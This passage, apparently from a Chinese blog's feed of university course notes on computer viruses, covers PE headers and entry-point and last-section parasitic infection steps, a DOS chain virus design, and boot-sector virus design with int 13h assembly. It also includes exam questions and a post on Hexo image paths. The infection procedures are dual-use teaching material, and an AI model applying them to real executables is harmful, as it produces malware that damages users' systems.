class="comment">//节在文件中对齐方式</span></span><br><span class="line">    MajorOperatingSystemVersion: Word;</span><br><span class="line">    MinorOperatingSystemVersion: Word;</span><br><span class="line">    MajorImageVersion: Word;</span><br><span class="line">    MinorImageVersion: Word;</span><br><span class="line">    MajorSubsystemVersion: Word;</span><br><span class="line">    MinorSubsystemVersion: Word;</span><br><span class="line">    Win32VersionValue: Cardinal;</span><br><span class="line">    SizeOfImage: Cardinal;       <span class="comment">//内存中整个PE文件的总大小，按内存对齐</span></span><br><span class="line">    SizeOfHeaders: Cardinal;</span><br><span class="line">    CheckSum: Cardinal;</span><br><span class="line">    Subsystem: Word;</span><br><span class="line">    DllCharacteristics: Word;</span><br><span class="line">    SizeOfStackReserve: Cardinal;</span><br><span class="line">    SizeOfStackCommit: Cardinal;</span><br><span class="line">    SizeOfHeapReserve: Cardinal;</span><br><span class="line">    SizeOfHeapCommit: Cardinal;</span><br><span class="line">    LoaderFlags: Cardinal;</span><br><span class="line">    NumberOfRvaAndSizes: Cardinal;<span class="comment">//数据目录的项数</span></span><br><span class="line">    DataDirectory: <span class="built_in">array</span>[<span class="number">0.</span>.IMAGE_NUMBEROF_DIRECTORY_ENTRIES - <span class="number">1</span>] of        </span><br><span class="line">                                                               TImage_Data_Directory;<span class="comment">//数据目录表</span></span><br><span class="line">  end;</span><br></pre></td></tr></table></figure><p>上述注释为可能用到的字段，<strong>“AddressOfEntryPoint”很关键</strong></p><h2 id="利用入口rva实现病毒执行"><a class="markdownIt-Anchor" href="#利用入口rva实现病毒执行"></a> 利用入口RVA实现病毒执行</h2><h3 id="修改入口地址对应指令"><a class="markdownIt-Anchor" href="#修改入口地址对应指令"></a> 修改入口地址对应指令</h3><ol><li><p>用PEView定位到AddressOfEntryPoint</p></li><li><p>用UE定位到AddressOfEntryPoint的值位置（注意值是RVA）</p></li><li><p>通过RVA找到文件的FOA</p><blockquote><p>入口点的RVA（AddressOfEntryPoint）- 节的RVA =</p><p>入口点的FOA - 节的起始文件位置（PointerToRawData）</p></blockquote></li><li><p>用eb 02 90 90替代原来内容，该指令汇编为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jmp aa</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">aa:</span><br></pre></td></tr></table></figure></li><li><p>用OD启动修改后程序，OD将停在第一条指令，观察第一条指令是eb 02 90 90</p></li><li><p>成功</p></li><li><p>注：程序的ImageBase+AddressOfEntryPoint就是入口点地址</p></li></ol><h3 id="直接修改入口点地址"><a class="markdownIt-Anchor" href="#直接修改入口点地址"></a> 直接修改入口点地址</h3><ol><li>找到AddressOfEntryPoint字段在文件中的偏移</li><li>用UE修改就好</li></ol><h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3><ol><li>下列哪个字段不在PE文件的可选头中（    ）<br />A．入口点地址<br />B．文件对齐大小<br />C．子系统<br />D．节表</li></ol><p>参考答案：D</p><p>解析：由前面的图知道，节表是在PE文件头后面的</p><h2 id="病毒加载到内存的问题"><a class="markdownIt-Anchor" href="#病毒加载到内存的问题"></a> 病毒加载到内存的问题</h2><h3 id="节表"><a class="markdownIt-Anchor" href="#节表"></a> 节表</h3><ol><li>节表紧跟在PE文件头后面，节表中每一个结构ImageSectionHeader（28H）都对应一个节，其中，SizeOfRawData描述了对应节的文件大小，VirtualSize描述了加载到内存的大小（两者可能不同，文件大小可以大于也可以小于内存大小，小于时将在内存补0）</li><li>在PE文件头的可选映像头中，SizeOfImage给出了整个程序包括所有头部加载到内存后的大小，其大小是SectionAlignment的整数倍（SectionAlignment是内存对齐的粒度、FileAlignment是文件对齐的粒度）</li><li>简单说，就是PE文件总大小和每个节的大小都有参数</li></ol><p>图示：</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210519083535334.png" alt="image-20210519083535334" /></p><h2 id="末节寄生"><a class="markdownIt-Anchor" href="#末节寄生"></a> 末节寄生</h2><h3 id="思想"><a class="markdownIt-Anchor" href="#思想"></a> 思想</h3><ol><li>如果该节内存大小&lt;文件大小，我们就在文件中将指令加载到该节的多余部分（对齐后的空洞）</li><li>然后修改节表SectionHeader中的VirtualSize字段（加载到内存的字节数）为修改后的大小，而对齐后的文件大小SizeOfRowData保持不变</li><li>注意，有时exe最后一个字节后有一些调试信息，但它不会被加载到内存，这也许就是SizeOfImage的意义，它阻止尾部多余信息进入内存</li></ol><h3 id="具体操作"><a class="markdownIt-Anchor" href="#具体操作"></a> 具体操作</h3><ol><li>首先找到最后一个节在文件中的位置，即其节表项中PointerToRawData字段</li><li>找到节中的寄生位置，就是VirtualSize字段后面</li><li>找到在文件中的寄生位置，PointerToRawData+VirtualSize</li><li>用UE在文件偏移到该处进行修改</li><li>修改最后一个节表中的VirtualSize</li><li>计算SizeOfImage=程序大小/SectionOfImage并向上取整，查看是否需要修改</li><li>修改AddressOfEntryPoint为新的程序入口RVA</li></ol><h3 id="文件长度变大"><a class="markdownIt-Anchor" href="#文件长度变大"></a> 文件长度变大</h3><ol><li>在reloc节原VirutalSize后添加JMP xx xx，在DOS部分已知机器码偏移量为两字节E9 xx xx</li><li>在reloc节后添加两个NOP指令</li><li>修改reloc节头的SizeOfRawData，加一个FileAlignment（1000h），为2000h</li><li>修改reloc节头的VirtualSize为原SizeOfRawData+2(两个nop) ，现在NOP才是实际结尾</li><li>修改可选映像头的SizeOfImage = (relocRVA+新VirutalSize)除以SectionAlign取上整</li><li>在NOP后手动增加1000h-2个字节，内容不论，为对齐后填充内容，以前是编译器自动填充</li><li>修改入口点RAV（AddressOfEntryPoint）</li></ol><p>图示：</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210519085921966.png" alt="image-20210519085921966" /></p><h3 id="例题-2"><a class="markdownIt-Anchor" href="#例题-2"></a> 例题</h3><ol><li>关于PE文件病毒，下列说法不正确的是（       ）<br />A. 需要对PE文件头的某些字段进行修改，保证感染后的PE文件合法<br />B. PE文件感染必然会增加PE文件的大小<br />C. 病毒可以通过修改PE文件入口点的值或者入口点处的指令来获得执行机会<br />D. 病毒可以将自身且分为多段，分别插入到PE文件各节的空洞中</li></ol><p>参考答案：B</p><p>解析：PE文件感染有的方式是不改变PE文件大小的</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;pe格式&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pe格式&quot;&gt;&lt;/a&gt; PE格式&lt;/h2&gt;
&lt;p&gt;在Win32位平台可执行文件命名为可移植的可执行文件（Portable Executable File），该文件的格式就是PE格式&lt;/p&gt;
&lt;p&gt;在Win32系统中，常见的EXE，DLL，SYS，COM等可执行文件都是PE文件&lt;/p&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>病毒_Win_虚拟地址</title>
    <link href="https://wsw8.online/archives/c7304b6b.html"/>
    <id>https://wsw8.online/archives/c7304b6b.html</id>
    <published>2021-05-12T08:06:01.000Z</published>
    <updated>2021-05-12T12:15:13.074Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ollydebug简介"><a class="markdownIt-Anchor" href="#ollydebug简介"></a> OllyDebug简介</h2><p>Windows下用户级调试神器——OllyDebug，简称OD</p><p>OD是强大的动态追踪工具，具有可视化操作界面，但是非常占内存</p><span id="more"></span><h3 id="基本功能"><a class="markdownIt-Anchor" href="#基本功能"></a> 基本功能</h3><ol><li>启动一个程序调试</li><li>Attach到一个已经运行的程序调试</li><li>单步，step into and step over</li><li>断点</li><li>继续运行</li><li>查看内存</li><li>修改内存</li><li>查看寄存器</li><li>修改寄存器</li><li>代码窗体跳到指定地址</li><li>修改指令</li><li>查看一个进程加载的dll</li><li>查看dll中有哪些函数</li><li>查找内存中的某个值</li></ol><h3 id="动态链接库dll"><a class="markdownIt-Anchor" href="#动态链接库dll"></a> 动态链接库DLL</h3><p>DLL（Dynamic Link Libraries）使得更新和重用程序更加方便</p><ol><li>是程序的一部分，作为模块被进程加载到自己的空间地址</li><li>在编译时不会插入可执行文件中，在运行时整个库的代码才会调入内存，这就是所谓的“动态链接”</li></ol><p>一些重要的动态链接库：</p><blockquote><p>Windows中有几个非常重要的底层DLL：Kernel32.dll、User32.dll、GDI32.dll、ntdll.dll</p><ol><li>Kernel32.dll顾名思义就是内核相关的功能，主要包含用于管理内存、进程和线程的函数</li><li>User32.dll中包含的则是用于执行用户界面的函数，比如把用户的鼠标点击操作传递给窗口，以便窗口根据用户的点击来执行预定的事件</li><li>GDI32.dll的名称用了缩写，全称是Graphical Device Interface（图形设备接口），包含用于画图和显示文本的函数，比如要显示一个程序窗口，就调用了其中的函数来画这个窗口</li><li>ntdll.dll是Windows系统从ring3到ring0的入口。位于Kernel32.dll和user32.dll中的所有win32 API最终都是调用ntdll.dll中的函数实现的</li></ol></blockquote><h2 id="windows内存管理和程序加载"><a class="markdownIt-Anchor" href="#windows内存管理和程序加载"></a> Windows内存管理和程序加载</h2><h3 id="保护模式内存管理"><a class="markdownIt-Anchor" href="#保护模式内存管理"></a> 保护模式内存管理</h3><ol><li>DOS的内存管理是实模式，我们可以随意改动甚至系统的内存（比如修改中断向量表）</li><li>Windows是工作在x86的保护模式。每个进程都有自己独立的线性地址空间（0-4GB，32位CPU的寻址能力是2^32=4GB），互不干扰，这4GB空间会按某个固定大小（如4KB）分成N个页</li><li>同时，内存又分为用户空间和内核空间，用户空间代码无法直接访问内核空间</li><li>其能防止应用程序非法访问其他应用程序的地址空间（任务间保护），防止应用程序非法访问操作系统地址空间（系统保护）</li></ol><h3 id="一个小实验"><a class="markdownIt-Anchor" href="#一个小实验"></a> 一个小实验</h3><p>在cmd中编译以下代码，编译命令<code>gcc a.c -o b.exe</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> gi;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input s to set gi or d to dispaly gi\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argCount, <span class="keyword">char</span> ** args)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argCount != <span class="number">2</span>)  &#123;</span><br><span class="line">        usage();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (args[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;s&#x27;</span>)  &#123;</span><br><span class="line">        gi = <span class="number">12</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;gi = %d\n&quot;</span>, gi);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&amp;gi = %d\n&quot;</span>,&amp;gi);</span><br><span class="line">        getchar();    <span class="comment">//进程持续挂起</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (args[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;d&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;gi = %d\n&quot;</span>, gi);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&amp;gi = %d\n&quot;</span>,&amp;gi);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> usage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后运行，会发现两个进程的值不同，但地址空间却相同！</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80/image-20210512200247086.png" alt="image-20210512200247086" /></p><p>这说明，我们看到的是“虚假”的内存地址</p><h3 id="原因分析"><a class="markdownIt-Anchor" href="#原因分析"></a> 原因分析</h3><p>在Windows系统下，处于保护模式，我们看见的内存地址是<strong>逻辑地址</strong>，并非真正的<strong>物理地址</strong></p><p>在DOS系统下，处于实模式，我们看见的内存地址就是真实的物理地址</p><p>同一逻辑地址的值对应不同物理上内存地址正是保护模式的能力</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80/image-20210512200650502.png" alt="image-20210512200650502" /></p><p><img src="/images/%E7%97%85%E6%AF%92-Win-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80/image-20210512200751672.png" alt="image-20210512200751672" /></p><h3 id="转换过程"><a class="markdownIt-Anchor" href="#转换过程"></a> 转换过程</h3><p>32位虚拟地址分成3部分</p><ol><li>CR3寄存器给出页目录地址</li><li>前面10位用于在页目录中查找页表地址</li><li>中间10位用于在页表中查找页表项</li><li>后面12位给出相对页表项地址的偏移</li></ol><p><img src="/images/%E7%97%85%E6%AF%92-Win-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80/image-20210512201221862.png" alt="image-20210512201221862" /></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ollydebug简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ollydebug简介&quot;&gt;&lt;/a&gt; OllyDebug简介&lt;/h2&gt;
&lt;p&gt;Windows下用户级调试神器——OllyDebug，简称OD&lt;/p&gt;
&lt;p&gt;OD是强大的动态追踪工具，具有可视化操作界面，但是非常占内存&lt;/p&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>hexo与typora的图片路径问题</title>
    <link href="https://wsw8.online/archives/d1451cce.html"/>
    <id>https://wsw8.online/archives/d1451cce.html</id>
    <published>2021-05-12T06:53:00.000Z</published>
    <updated>2021-05-12T07:31:34.667Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题描述"><a class="markdownIt-Anchor" href="#问题描述"></a> 问题描述</h2><p>不知道新搭建博客的你是否遇到这个问题，用typora写文章时难免要添加一些图片，而正好typora会默认在当前目录<code>hexo/source/_post</code>里创建一个后缀名为<code>.asset</code>的文件夹来存放图片，乍一看，挺好，typora里正常显示，而一推到hexo博客图片就因为路径原因看不了了</p><span id="more"></span><h2 id="问题分析"><a class="markdownIt-Anchor" href="#问题分析"></a> 问题分析</h2><p>路径原因，在typora里默认当前文件存储位置<code>hexo/source/_post</code>为起始目录，而hexo默认source文件夹<code>hexo/source</code>为起始目录，这也就导致了在typora里无论你写相对路径还是绝对路径推到hexo时都是找不到的</p><h2 id="解决方法"><a class="markdownIt-Anchor" href="#解决方法"></a> 解决方法</h2><p>查了很多方法，网上也有人总结了几大解决方案，觉得不怎么好用，综合之下我决定这样更改</p><ol><li><p>为每篇文章设定其根目录</p><blockquote><p>typora里是可以自己设定根目录的，在每篇文章的开头中加入</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">typora-root-url:</span> <span class="string">../</span></span><br></pre></td></tr></table></figure><p>这样typora里的起始目录就和hexo里一致了</p></blockquote></li><li><p>已经写好的文章只能手动添加了，即将写的文章每次都手动加难免累，我们可以更改hexo里的模板<code>hexo/scaffolds/post.md</code>，这是你使用<code>hexo n 文章名</code>命令时生成的模板</p><blockquote><p>post.md的开头内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> &#123;&#123; <span class="string">title</span> &#125;&#125;</span><br><span class="line"><span class="attr">typora-root-url:</span> <span class="string">../</span></span><br><span class="line"><span class="attr">date:</span> &#123;&#123; <span class="string">date</span> &#125;&#125;</span><br></pre></td></tr></table></figure><p>这样新生成的文章都会以<code>hexo/source</code>为根目录</p></blockquote></li><li><p>更改typora的设置</p><blockquote><p>打开typora的<code>偏好设置</code>，选中<code>图像</code>，更改其设置</p><ol><li><p>选择<code>复制到指定路径</code></p></li><li><p>路径里填你博客的绝对路径，例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\Blog\source\images\$&#123;filename&#125;</span><br></pre></td></tr></table></figure><p>注意后面加${filename}就会以你文章名在images下新建一个图片文件夹，看起来井井有条一些</p></li><li><p>下面的设置一定要勾选<code>优先使用相对路径</code>，这样会防止你贴个图片结果贴成了绝对路径导致hexo不认识</p></li><li><p>参考配置如下图</p><p><img src="/images/hexo%E4%B8%8Etypora%E7%9A%84%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/image-20210512152029191.png" alt="image-20210512152029191" /></p></li></ol></blockquote></li><li><p>搞定，看看效果</p><p><img src="/images/hexo%E4%B8%8Etypora%E7%9A%84%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/image-20210512152225354.png" alt="image-20210512152225354" /></p></li></ol><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p>解决的思想就是让hexo与typora都能认识写的这个路径，也就是说写成<code>/images/文件夹名/图片名</code>这种形式（没办法，hexo默认的就是以<code>hexo/source</code>为根的），所以要对typora进行一些相对复杂的配置让typora也能认识这个路径，于是，我们更改了typora文章的url根目录，并优先使用相对路径。ok，搞定！</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;问题描述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#问题描述&quot;&gt;&lt;/a&gt; 问题描述&lt;/h2&gt;
&lt;p&gt;不知道新搭建博客的你是否遇到这个问题，用typora写文章时难免要添加一些图片，而正好typora会默认在当前目录&lt;code&gt;hexo/source/_post&lt;/code&gt;里创建一个后缀名为&lt;code&gt;.asset&lt;/code&gt;的文件夹来存放图片，乍一看，挺好，typora里正常显示，而一推到hexo博客图片就因为路径原因看不了了&lt;/p&gt;</summary>
    
    
    
    <category term="博客" scheme="https://wsw8.online/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="自学" scheme="https://wsw8.online/tags/%E8%87%AA%E5%AD%A6/"/>
    
    <category term="博客" scheme="https://wsw8.online/tags/%E5%8D%9A%E5%AE%A2/"/>
    
    <category term="博客搭建" scheme="https://wsw8.online/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>病毒_DOS_链式病毒</title>
    <link href="https://wsw8.online/archives/b1495143.html"/>
    <id>https://wsw8.online/archives/b1495143.html</id>
    <published>2021-05-12T01:50:21.000Z</published>
    <updated>2021-05-12T08:04:28.924Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h2><p>之前的病毒在每份感染文件中都复制了一份病毒拷贝，而链式病毒只保留一份病毒拷贝，其利用文件目录项，将受感染文件的头簇指向病毒</p><span id="more"></span><h2 id="复习"><a class="markdownIt-Anchor" href="#复习"></a> 复习</h2><p>回顾一下文件的查找过程</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E9%93%BE%E5%BC%8F%E7%97%85%E6%AF%92/image-20210512095523949.png" alt="image-20210512095523949" /></p><h2 id="工作原理"><a class="markdownIt-Anchor" href="#工作原理"></a> 工作原理</h2><p>感染过程：</p><ol><li>如首次感染，将病毒保存在某个空闲扇区</li><li>将被感染文件（com文件）首簇存目录项保留段</li><li>修改首簇指向病毒的首簇</li></ol><p>执行过程：</p><ol><li>执行被感染文件则启动病毒，加载的是病毒的首簇，并执行</li><li>病毒获取当前执行程序的名字，获取对应目录项。从其中保留字段获取原文件首簇号，并遍历FAT簇链加载它们</li><li>跳到原文件加载的内存中执行</li></ol><h2 id="病毒设计"><a class="markdownIt-Anchor" href="#病毒设计"></a> 病毒设计</h2><h3 id="感染部分"><a class="markdownIt-Anchor" href="#感染部分"></a> 感染部分</h3><ol><li>被感染文件的真实起始扇区号写到<strong>目录表项的保留区</strong>（目录项的保留区从目录项头第13个字节即偏移0ch开始，共10字节）</li><li>修改被感染文件的目录项的起始扇区字段指向病毒文件的首簇</li><li>目录项中的文件大小字段也要修改成病毒的真实大小，这样才能保证病毒能被完整加载</li><li>将原来病毒文件的目录项全部32字节改为0，这样从外部看就不存在这个病毒文件，也没有对应的目录项了</li></ol><h3 id="执行部分"><a class="markdownIt-Anchor" href="#执行部分"></a> 执行部分</h3><ol><li>先获取被感染程序的名字</li><li>然后从根目录寻找被感染程序的目录项</li><li>找到后从该文件目录项的保留区获取被感染程序的首簇号</li><li>找到被感染程序所在簇（即扇区），加载该扇区到内存</li></ol><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E9%93%BE%E5%BC%8F%E7%97%85%E6%AF%92/image-20210512144855424.png" alt="image-20210512144855424" /></p><h2 id="重点"><a class="markdownIt-Anchor" href="#重点"></a> 重点</h2><h3 id="获取执行文件名"><a class="markdownIt-Anchor" href="#获取执行文件名"></a> 获取执行文件名</h3><ol><li>从com文件的ds：2c处获得环境块首址的段地址</li><li>环境块就在段地址：0000处</li><li>环境块内容PATH=……COMSPEC=C:\<a href="http://COMMAND.COM">COMMAND.COM</a>\0…0 0 xxxx</li><li>环境块开始是PATH等0字符结尾的串，最后是两个00字符。然后有两个字节可能是数目，之后就是执行程序的名字</li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;介绍&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#介绍&quot;&gt;&lt;/a&gt; 介绍&lt;/h2&gt;
&lt;p&gt;之前的病毒在每份感染文件中都复制了一份病毒拷贝，而链式病毒只保留一份病毒拷贝，其利用文件目录项，将受感染文件的头簇指向病毒&lt;/p&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>病毒_DOS_引导与中断</title>
    <link href="https://wsw8.online/archives/11d03106.html"/>
    <id>https://wsw8.online/archives/11d03106.html</id>
    <published>2021-05-12T00:43:47.000Z</published>
    <updated>2021-05-12T01:45:58.926Z</updated>
    
    <content type="html"><![CDATA[<h2 id="面向文件系统的病毒引导型病毒"><a class="markdownIt-Anchor" href="#面向文件系统的病毒引导型病毒"></a> 面向文件系统的病毒——引导型病毒</h2><h3 id="大致思路"><a class="markdownIt-Anchor" href="#大致思路"></a> 大致思路</h3><p>将病毒放在软盘的引导扇区，并将原来的引导代码放到数据区，在执行完病毒代码后拷贝回原来的引导代码，并将执行权交给引导代码</p><span id="more"></span><h3 id="问题"><a class="markdownIt-Anchor" href="#问题"></a> 问题</h3><ol><li>自我覆盖的问题，所以需要我们将病毒中执行拷贝指令的代码移出被覆盖区域</li><li>如何使别的数据不使用簇2的问题，这里我们可以修改FAT1和FAT2表，将簇2改为不可用，如果改为已占用的FFF，由于没有对应目录项会很可疑，所以改为坏簇FF7</li></ol><h3 id="磁盘访问int-13h中断"><a class="markdownIt-Anchor" href="#磁盘访问int-13h中断"></a> 磁盘访问int 13h中断</h3><p>复位磁盘系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Xor ah, ah;ah&#x3D;0为磁盘复位</span><br><span class="line">int 13h;13h为磁盘中断</span><br></pre></td></tr></table></figure><p>读指定从磁头，道，扇区起始，n个扇区道内存缓冲</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">AH &#x3D; 02h是读扇区功能号</span><br><span class="line">AL &#x3D; 将读入多少个扇区</span><br><span class="line">CL &#x3D; 起始扇区号</span><br><span class="line">CH &#x3D; 磁道</span><br><span class="line">DH &#x3D; 磁头</span><br><span class="line">DL &#x3D; 磁盘，0代表a盘</span><br><span class="line">ES:BX &#x3D; 读缓冲的地址，一般只填写BX</span><br><span class="line"></span><br><span class="line">Mov ah, 02</span><br><span class="line">Mov al, 5;读5个扇区</span><br><span class="line">Mov cl, 1;从1扇区开始</span><br><span class="line">Mov ch, 0;读0道</span><br><span class="line">Mov dh，0;读0头</span><br><span class="line">Mov dl, 0;读a盘</span><br><span class="line">Mov bx,7c00h;读到7c00h处</span><br><span class="line">int 13h</span><br></pre></td></tr></table></figure><p>设计一个基于0开始的绝对扇区读函数</p><p>功能：将绝对扇区号转化为磁头，道，扇区的CHS寻址方式</p><p>如何转化？</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%BC%95%E5%AF%BC%E4%B8%8E%E4%B8%AD%E6%96%AD/image-20210512090322696.png" alt="image-20210512090322696" /></p><p>具体实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ReadSector:;该函数的绝对扇区号是从0开始的</span><br><span class="line">;函数参数：ax开始绝对扇区号, cl读扇区数, bx读缓冲地址</span><br><span class="line">mov bp, sp</span><br><span class="line">sub sp, 2</span><br><span class="line">push bx             ;保持读缓冲地址</span><br><span class="line">mov byte [bp - 2], cl;保持读扇区数</span><br><span class="line">mov bl, 18;除数18</span><br><span class="line">div bl           ;被除数ax是绝对扇区号，除以18，余数在ah中，商在al中</span><br><span class="line">inc ah     ;余数加1为道内扇区号</span><br><span class="line">mov cl, ah    ;int 13h中断参数设置cl&#x3D;道内扇区号</span><br><span class="line">mov dh, al    ;dh &#x3D; N</span><br><span class="line">and dh, 1      ;N&amp;1为磁头，int 13h中断参数设置dh&#x3D;磁头号  </span><br><span class="line">shr al, 1     ;N 右移1位，al &#x3D; 磁道号</span><br><span class="line">mov ch, al    ;ch&#x3D;磁道号，int 13h中断参数设置ch&#x3D;道号</span><br><span class="line">mov dl, 0    ;int 13参数设置，dl&#x3D;0，读软盘</span><br><span class="line">pop bx      ;获得读缓冲地址，设置int 13h参数，bx&#x3D;读缓冲地址</span><br><span class="line">mov ah, 02h           ;int 13h参数设置，读扇区功能号</span><br><span class="line">mov al, [bp - 2]      ;获得读扇区数，int 13h参数设置，al&#x3D;读取扇区数</span><br><span class="line">int 13h</span><br><span class="line">add sp, 2</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h3 id="执行部分程序设计"><a class="markdownIt-Anchor" href="#执行部分程序设计"></a> 执行部分程序设计</h3><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%BC%95%E5%AF%BC%E4%B8%8E%E4%B8%AD%E6%96%AD/image-20210512090455764.png" alt="image-20210512090455764" /></p><h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3><ol><li>关于软盘引导型病毒，下列说法不正确的是（       ）<br />A. 病毒感染时会将原引导扇区内容拷贝到软盘的数据区<br />B. 病毒执行时会将原引导扇区内容从软盘的数据区拷贝到内存7C00处<br />C. 病毒将原引导扇区的内容拷贝到7C00时需要处理自我覆盖的问题<br />D. 病毒感染时必须覆盖原引导扇区的全部内容才能获得执行</li></ol><p>参考答案：D</p><ol 